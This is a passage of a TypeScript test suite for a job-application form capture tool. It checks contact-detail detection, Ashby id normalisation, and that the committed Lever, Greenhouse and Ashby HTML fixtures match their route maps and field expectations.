    expect(name?.test('by j.r. (jane) today')).toBe(true);
    expect(name?.test('by JxR. (Jane)')).toBe(false);
    for (const spelling of ['+1 (555) 010-0142', '15550100142', '1.555.010.0142']) expect(phone?.test(spelling), spelling).toBe(true);
    expect(phone?.test('215550100142')).toBe(false);
  });

  it('finds emails and phone numbers, and leaves ids, dates and image names alone', () => {
    const email = new RegExp(EMAIL_SOURCE, 'g');
    expect('Write to jobs@acme.co.uk or a.b+c@x-y.io.'.match(email)).toEqual(['jobs@acme.co.uk', 'a.b+c@x-y.io']);
    const phone = new RegExp(PHONE_SOURCE, 'g');
    const phones = (text: string) => (text.match(phone) ?? []).filter((match) => {
      const digits = match.replace(/\D/g, '').length;
      return digits >= (match.startsWith('+') ? PHONE_DIGITS.minWithPlus : PHONE_DIGITS.min) && digits <= PHONE_DIGITS.max;
    });
    expect(phones('Call +1 (555) 010-0199, 555.010.0199, 555-010-0199 or +15550100199.')).toEqual(
      ['+1 (555) 010-0199', '555.010.0199', '555-010-0199', '+15550100199']);
    expect(phones('Job 8857185002, question_38599927002, 2026-10-29 22:38:44, /jobs/555-010-0199, v1.2.3')).toEqual([]);
  });

  it('converts the frames on the hosts src/shared/hosts.ts lists, and no others', () => {
    for (const url of [EMBED, 'https://boards.greenhouse.io/x/jobs/1', 'https://jobs.lever.co/x', 'https://jobs.eu.lever.co/x',
      'https://jobs.ashbyhq.com/x', 'https://wlu.wd5.myworkdayjobs.com/x', 'https://wd5.myworkdaysite.com/recruiting/x',
      'https://job-boards.eu.greenhouse.io/x/jobs/1', 'http://jobs.lever.co/x', 'https://jobs.lever.co.tailorit-fixture.example/x',
      CAPTCHA, 'https://www.recaptcha.net/recaptcha/enterprise/anchor', 'https://myworkdayjobs.com/x', PAGE]) {
      expect(onAtsHost(url), url).toBe(platformOfUrl(url) !== null);
    }
  });

  it("normalises Ashby's per-load ids: each form's render id wherever it stands, in the order first named, and the CSP nonce", () => {
    const application = '0513f5fb-8aae-4048-940a-6d47266a985e';
    const survey = 'f575a297-f052-48fa-a651-98a61e7ff792';
    const html = `<meta name="csp-nonce" id="csp-nonce" content="Lp7cAcoyl3XMaoSiuDAT4ngp">`
      + `<div data-field-path="_systemfield_name" data-field-entry-id="${application}__systemfield_name"></div>`
      + `<div data-field-path="x" data-field-entry-id="${application}_x"><input type="radio" id="${application}_x-labeled-radio-0" `
      + `name="${application}_x"><label for="${application}_x-labeled-radio-0">A</label></div>`
      + `<div data-field-path="_systemfield_eeoc_gender" data-field-entry-id="${survey}__systemfield_eeoc_gender"></div>`
      + '<p>d4780eac-03ad-4dae-861f-99af22b4287e stays: no data-field-entry-id names it</p>';
    const { text, renderIds, nonces } = normaliseAshby(html);
    expect(renderIds).toEqual([application, survey]);
    expect(nonces).toBe(1);
    expect(text).not.toContain(application);
    expect(text).not.toContain(survey);
    expect(text).not.toContain('Lp7cAcoyl3XMaoSiuDAT4ngp');
    expect(text).toContain(`data-field-entry-id="${ashbyRenderId(0)}__systemfield_name"`);
    expect(text).toContain(`<input type="radio" id="${ashbyRenderId(0)}_x-labeled-radio-0" name="${ashbyRenderId(0)}_x">`);
    expect(text).toContain(`data-field-entry-id="${ashbyRenderId(1)}__systemfield_eeoc_gender"`);
    expect(text).toContain('content="REDACTED"');
    expect(text).toContain('d4780eac-03ad-4dae-861f-99af22b4287e stays');
    expect(ashbyRenderId(0)).toBe('00000000-0000-4000-8000-000000000001');
    // Any other page is left as it is: the converter normalises only --platform ashby.
    expect(normaliseAshby('<div id="a"></div>')).toEqual({ text: '<div id="a"></div>', renderIds: [], nonces: 0 });
  });

  it('checks the written text with encodings undone, but not inside stylesheets or base64 payloads', () => {
    const [raw, entities, percents] = checkedForms('<a href="?q=Jane%20Roe" title="O&#39;Brien &amp; Co">' +
      '<style>.Jane-Roe{}</style><img src="data:image/png;base64,SmFuZSBSb2U=">');
    expect(raw).not.toContain('jane roe');
    expect(entities).toContain("o'brien & co");
    expect(percents).toContain('?q=jane roe');
    expect(percents).not.toContain('jane-roe');
    expect(percents).toContain('<img src="data:image/png;base64,">');
  });
});

// ---------------------------------------------------------------------------------------------------------------------
// The committed fixtures (docs/FIXTURES.md): converted files, route maps and hand-written expectations agree
// ---------------------------------------------------------------------------------------------------------------------

interface Expectation {
  fixture: string;
  source: string;
  captured: string;
  fields: Array<{ label: string; kind: string; required: boolean; section: string; fillable: boolean;
    reason?: string; options?: number | 'lazy'; control: string; note?: string }>;
}

/** The reasons a control is not fillable (docs/FIXTURES.md). */
const NOT_FILLABLE = ['widget-phase-4', 'not-user-visible'];
const CHOICE_KINDS = ['select', 'radio', 'checkbox-group', 'combobox', 'multiselect', 'typeahead-remote'];
const CASES = ['lever', 'greenhouse', 'ashby'].flatMap((platform) => readdirSync(join(ROOT, 'fixtures', platform))
  .filter((name) => name.endsWith('.expect.json')).map((name) => `${platform}/${name.slice(0, -'.expect.json'.length)}`));
/** A frame's case (ashby/ashby-embed-closed.frame-1: the form inside a company's page) is served by its page's route
 *  map. */
const routesOf = (name: string) => join(ROOT, 'fixtures', `${name.replace(/\.frame-\d+$/, '')}.routes.json`);
/** The Ashby captures of a list open, which have no expectations: floating-ui marks the rest of the page aria-hidden
 *  while a list is open, and no scan runs then (docs/FIXTURES.md, "The Ashby capture"). */
const LIST_STATES = ['ashby/multiverse-select-open', 'ashby/openai-location-results', 'ashby/plaid-school-results'];

describe('the committed Lever, Greenhouse and Ashby fixtures', () => {
  it('are the six cases from the owner\'s captures, the six closed forms of the Greenhouse widget capture, the BeyondTrust form and the Ashby capture', () => {
    expect(CASES.sort()).toEqual(['ashby/ashby-embed-closed.frame-1', 'ashby/cohere-closed', 'ashby/incident-closed',
      'ashby/multiverse-closed', 'ashby/notion-closed', 'ashby/openai-checkbox-ticked',
      'ashby/openai-closed', 'ashby/openai-datepicker-open', 'ashby/openai-gh-closed',
      'ashby/openai-radio-chosen', 'ashby/openai-yesno-chosen', 'ashby/plaid-closed', 'greenhouse/affirm-job',
      'greenhouse/asana-embed', 'greenhouse/beyondtrust-job', 'greenhouse/discord-job', 'greenhouse/discord-ml-job',
      'greenhouse/figma-legacy-host', 'greenhouse/gitlab-embed', 'greenhouse/gitlab-job', 'greenhouse/gusto-job',
      'greenhouse/twilio-job', 'greenhouse/twitch-job', 'lever/spotify-ny', 'lever/zoox-fostercity']);
    // Every other Ashby fixture is one of the open-list captures, or a page around a form.
    const ashby = readdirSync(join(ROOT, 'fixtures', 'ashby')).filter((name) => name.endsWith('.html'))
      .map((name) => `ashby/${name.slice(0, -'.html'.length)}`).filter((name) => !CASES.includes(name));
    expect(ashby.sort()).toEqual(['ashby/ashby-embed-closed', ...LIST_STATES]);
  });

  it.each(LIST_STATES)('%s: its files, route map and header agree, and it holds the Ashby page with its list open', (name) => {
    const routes = JSON.parse(readFileSync(routesOf(name), 'utf8')) as Record<string, string>;
    const html = readFileSync(join(ROOT, 'fixtures', `${name}.html`), 'utf8');
    const header = JSON.parse(/<!-- TailorIT fixture[^\n]*\n(\{.*\}) -->/.exec(html)?.[1] ?? '{}');
    expect(header).toMatchObject({ fixture: name, normalised: { renderIds: expect.any(Number), nonces: 1 } });
    expect(routes[header.source]).toBe(`fixtures/${name}.html`);
    const body = html.slice(html.indexOf('-->') + 3);
    expect(body).not.toMatch(/<script|<noscript|<base|http-equiv|javascript:|\son[a-z]+=|<link[^>]*stylesheet|\r/i);
    expect(body).toMatch(/data-floating-ui-portal[^>]*>\s*<div[^>]*role="listbox"/);
    expect(body).toContain('data-aria-hidden="true" aria-hidden="true"');
  });

  it.each(CASES)('%s: files, route map, header and expectations agree', (name) => {
    const file = (suffix: string) => join(ROOT, 'fixtures', `${name}${suffix}`);
    const expectation = JSON.parse(readFileSync(file('.expect.json'), 'utf8')) as Expectation;
    const routes = JSON.parse(readFileSync(routesOf(name), 'utf8')) as Record<string, string>;
    const html = readFileSync(file('.html'), 'utf8');
    expect(expectation.fixture).toBe(name);
    expect(routes[expectation.source]).toBe(`fixtures/${name}.html`);
    for (const [url, path] of Object.entries(routes)) {
      expect(new URL(url).hash, url).toBe('');
      expect(path.startsWith(`fixtures/${name.replace(/\.frame-\d+$/, '')}.`) && existsSync(join(ROOT, path)), path).toBe(true);
    }
    // An Ashby page's per-load ids are normalised: no render id but the fixed ones, and the CSP nonce redacted.
    if (name.startsWith('ashby/')) {
      const ids = new Set([...html.matchAll(/data-field-entry-id="([0-9a-f-]{36})_/g)].map((match) => match[1]));
      expect([...ids].every((id) => /^00000000-0000-4000-8000-0000000000\d\d$/.test(id ?? '')), name).toBe(true);
      expect(html).not.toMatch(/name="csp-nonce"[^>]*content="(?!REDACTED")/);
    }
    const header = JSON.parse(/<!-- TailorIT fixture[^\n]*\n(\{.*\}) -->/.exec(html)?.[1] ?? '{}');
    expect(header).toMatchObject({ fixture: name, source: expectation.source, captured: expectation.captured });
    expect(header.chrome).toMatch(/^\d+\.\d+\.\d+\.\d+$/);
    const body = html.slice(html.indexOf('-->') + 3);
    expect(body).not.toMatch(/<script|<noscript|<base|http-equiv|javascript:|\son[a-z]+=|<link[^>]*stylesheet|\r/i);
    expect([...body.matchAll(/<form\b[^>]*>/g)].every(([form]) => form.includes('action="/__submitted"'))).toBe(true);
    for (const field of expectation.fields) {
      expect(FIELD_KINDS as readonly string[], field.control).toContain(field.kind);
      if (field.fillable) expect(field.reason, field.control).toBeUndefined();
      else expect(NOT_FILLABLE, field.control).toContain(field.reason);
      if (field.options !== undefined) expect(CHOICE_KINDS, field.control).toContain(field.kind);
      if (field.fillable) expect(field.label, field.control).not.toBe('');
    }
  });

  it.each(CASES)('%s: every control on the page is listed once, and each entry matches the page', async (name) => {
    const expectation = JSON.parse(readFileSync(join(ROOT, 'fixtures', `${name}.expect.json`), 'utf8')) as Expectation;
    const routes = JSON.parse(readFileSync(routesOf(name), 'utf8')) as Record<string, string>;
    const context = await browser.newContext({ viewport: VIEWPORT });
    await context.route('**/*', (route) => {
      const path = routes[route.request().url()];
      return path ? route.fulfill({ status: 200, contentType: 'text/html', body: readFileSync(join(ROOT, path), 'utf8') })
        : route.abort();
    });
    const page = await context.newPage();
    await page.goto(expectation.source);
    const problems = await page.evaluate(({ fields, ashby }) => {
      const found: string[] = [];
      const rendered = (element: Element) => {
        const rect = element.getBoundingClientRect();
        return element.checkVisibility({ checkOpacity: true, checkVisibilityCSS: true }) && rect.width >= 4 &&
          rect.height >= 4 && getComputedStyle(element).clip === 'auto';
      };
      const visibleText = (document.body.innerText ?? '').replace(/\s+/g, ' ');
      const listed = new Set<Element>();
      for (const field of fields) {
        const elements = [...document.querySelectorAll(field.control)];
        const where = `${field.control} (${field.label || 'no label'})`;
        for (const element of elements) {
          if (listed.has(element)) found.push(`listed twice: ${where}`);
          listed.add(element);
        }
        const group = field.kind === 'radio' || field.kind === 'checkbox-group';
        if (elements.length !== (group ? field.options : 1)) found.push(`${elements.length} elements for ${where}`);
        const first = elements[0];
        if (!first) continue;
        if (field.kind === 'select' && (first as HTMLSelectElement).options.length !== field.options) {
          found.push(`option count for ${where}`);
        }
        // Fillable native controls render; hidden ones do not. A file input renders behind its widget instead, and on
        // an Ashby page a radio or checkbox drawn at opacity 0 behind its label.
        const shownByLabel = (element: Element) => ashby
          && Array.from((element as HTMLInputElement).labels ?? []).some(rendered);
        if (field.fillable && field.kind !== 'file' && !elements.some((element) => rendered(element) || shownByLabel(element))) {
          found.push(`not rendered: ${where}`);
        }
        if (field.kind === 'file' && elements.some(rendered)) found.push(`file input rendered: ${where}`);
        if (field.reason === 'not-user-visible' && elements.some(rendered)) found.push(`rendered: ${where}`);
        // An Ashby month or year list's label is its block's "Start Date" with the adapter's "month" or "year".
        const shownLabel = ashby && field.kind === 'select' ? field.label.replace(/ (?:month|year)$/, '') : field.label;
        if (field.fillable && !visibleText.includes(shownLabel)) found.push(`label not shown: ${where}`);
      }
      const controls = [...document.querySelectorAll('input, select, textarea')].filter((element) =>
        !['hidden', 'submit', 'button', 'reset', 'image'].includes((element.getAttribute('type') ?? '').toLowerCase()));
      for (const control of controls) if (!listed.has(control)) found.push(`unlisted: ${control.outerHTML.slice(0, 120)}`);
      return found;
    }, { fields: expectation.fields, ashby: name.startsWith('ashby/') });
    await context.close();
    expect(problems).toEqual([]);
  }, 60_000);
});
